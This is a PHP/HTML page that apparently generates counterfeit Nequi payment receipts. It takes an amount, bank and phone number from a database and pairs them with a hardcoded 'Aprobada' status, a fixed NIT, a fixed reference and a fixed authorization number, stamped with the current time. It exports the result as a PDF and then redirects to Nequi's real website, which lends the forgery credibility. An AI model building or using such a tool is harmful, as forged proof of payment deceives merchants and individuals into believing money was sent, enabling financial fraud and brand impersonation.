<?php
require 'conexion.php';

// Último registro
$stmt = $pdo->query("SELECT * FROM solicitudes ORDER BY id DESC LIMIT 1");
$data = $stmt->fetch(PDO::FETCH_ASSOC);

// Detectar imágenes disponibles dinámicamente
$logo     = file_exists('img/logof.png')    ? 'img/logof.png'
          : (file_exists('img/logo.png')    ? 'img/logo.png'
          : (file_exists('img/h1.png')      ? 'img/h1.png'
          : (file_exists('img/h1.jpg')      ? 'img/h1.jpg' : '')));

$aprobado = file_exists('img/aprobado3.jpg') ? 'img/aprobado3.jpg'
          : (file_exists('img/aprobado2.jpg') ? 'img/aprobado2.jpg' : '');
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Recibo</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: #fff;
    font-family: Arial, sans-serif;
  }

  .recibo {
    width: 100%;
    max-width: 800px;      /* Se redujo el ancho */
    margin: 15px auto;     /* Se redujo el margen */
    border: 1px solid #ccc;
    background: #fff;
    border-radius: 8px;    /* Se redujo el radio del borde */
    box-sizing: border-box;
    padding: 20px;         /* Se redujo el padding */
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);  /* Se redujo la sombra */
  }

  .recibo h3 {
    text-align: center;
    margin-bottom: 20px;  /* Se redujo el margen inferior */
    font-size: 24px;      /* Se redujo el tamaño de la fuente */
    color: #222;
  }

  .recibo p {
    margin: 12px 0;       /* Se redujo el margen */
    font-size: 18px;      /* Se redujo el tamaño de la fuente */
    line-height: 1.5;
    word-wrap: break-word;
  }

  .recibo label {
    color: #da0081;
    font-weight: bold;
    font-size: 18px;      /* Se redujo el tamaño de la fuente */
  }

  /* Para móviles */
  @media (max-width: 480px) {
    .recibo {
      width: 100%;
      height: auto;
      border-radius: 0;
      border: none;
      padding: 15px;       /* Se redujo el padding */
      box-shadow: none;
    }

    .recibo h3 {
      font-size: 20px;     /* Se redujo el tamaño de la fuente */
    }

    .recibo p, .recibo label {
      font-size: 16px;     /* Se redujo el tamaño de la fuente */
    }
  }

  /* Botón */
  .btn-imprimir {
    display: block;
    width: 70%;
    margin: 20px auto 30px;
    padding: 14px 0;
    font-size: 22px;
    font-weight: bold;
    color: #fff;
    background: linear-gradient(135deg, #da0081, #a3005f);
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: transform 0.2s ease, opacity 0.2s;
    box-shadow: 0 4px 14px rgba(218,0,129,0.35);
  }
  .btn-imprimir:hover  { opacity: 0.9; transform: translateY(-2px); }
  .btn-imprimir:active { transform: scale(0.97); }

  @media print {
    .btn-imprimir { display: none !important; }
    body { background: #fff; }
    .recibo { box-shadow: none; border: none; }
  }
</style>
</head>

<body>
  <center>
    <?php if ($logo): ?>
    <img src="<?= htmlspecialchars($logo) ?>" width="45%" alt="Logo" style="max-height:80px;object-fit:contain;">
    <?php endif; ?>
  </center>

  <div class="recibo">
    <?php if ($aprobado): ?>
    <img src="<?= htmlspecialchars($aprobado) ?>" width="100%" alt="Aprobado">
    <?php endif; ?>
    <div style="padding: 3%;">  <!-- Se redujo el padding -->
      <p><label>Empresa</label><br>Nequi</p>
      <p><label>NIT</label><br>81034092</p>
      <p><label>Estado</label><br>Aprobada</p>
      <p><label>Fecha y hora</label><br><span id="fechaHora"></span></p>
      <p><label>Referencia</label><br>172921711564491847</p>
      <p><label>Autorización</label><br>538741178</p>
      <p><label>Monto</label><br><?= htmlspecialchars($data['monto']) ?></p>
      <p><label>Banco</label><br><?= htmlspecialchars($data['banco']) ?></p>
      <p><label>Número de celular</label><br><?= htmlspecialchars($data['numero_cuenta']) ?></p>
    </div>
  </div>
<br>
  <button id="btnDescargar" class="btn-imprimir" onclick="descargarRecibo()">
    ⬇ Descargar recibo
  </button>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
  <script>
    document.getElementById("fechaHora").textContent = new Date().toLocaleString("es-CO", {
      year: "numeric", month: "long", day: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit"
    });

    function descargarRecibo() {
      const btn = document.getElementById("btnDescargar");
      btn.textContent = "Generando PDF...";
      btn.disabled = true;

      const element = document.querySelector(".recibo");
      html2pdf().set({
        margin:       [8, 8, 8, 8],
        filename:     "recibo-nequi.pdf",
        image:        { type: "jpeg", quality: 0.98 },
        html2canvas:  { scale: 2, useCORS: true, logging: false },
        jsPDF:        { unit: "mm", format: "a4", orientation: "portrait" }
      }).from(element).save().then(() => {
        window.location.replace("https://www.nequi.com.co/");
      });
    }
  </script>
</body>
</html>
